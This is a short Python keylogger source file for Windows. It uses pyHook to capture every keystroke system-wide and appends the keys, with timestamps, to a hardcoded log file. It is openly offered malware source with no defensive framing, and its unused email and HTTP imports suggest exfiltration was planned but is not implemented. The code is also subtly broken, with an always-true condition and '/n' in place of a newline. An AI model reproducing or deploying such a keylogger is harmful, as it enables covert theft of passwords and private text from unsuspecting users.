#!/usr/bin/python
#!/usr/bin/python3

# -*- coding: utf8 -*-
# date                 :- 
# author               :- Md Jabed Ali(jabed)

import os
import win32api
import win32console
import win32gui
import pythoncom
import pyHook
import sys
import time
import os
import smtplib
import platform
import requests
from datetime import datetime

# an initial keystroke of keyboard.
def keystroke(var):
    if var.Ascii==5:
         sys.exit()
    if var.Ascii is not 0 or 8:
        file = open(r'C:\Users\paradox\keystroke\log.txt', 'r+')
        read = file.read()
        file.close()
        file = open(r'C:\Users\paradox\keystroke\log.txt', 'w')
        logs = chr(var.Ascii)
        if var.Ascii==13:
            logs = '/n' + datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S')
        elif var.Ascii==32:
            logs = '/n' + datetime.strftime(datetime.now(), '%Y-%m-%d-%H-%M-%S')    
        read += logs
        file.write(read)
        file.close()
    return True

if __name__ == "__main__":
    hook = pyHook.HookManager()
    hook.KeyDown = keystroke
    hook.HookKeyboard()
    pythoncom.PumpMessages()

#while True:
    
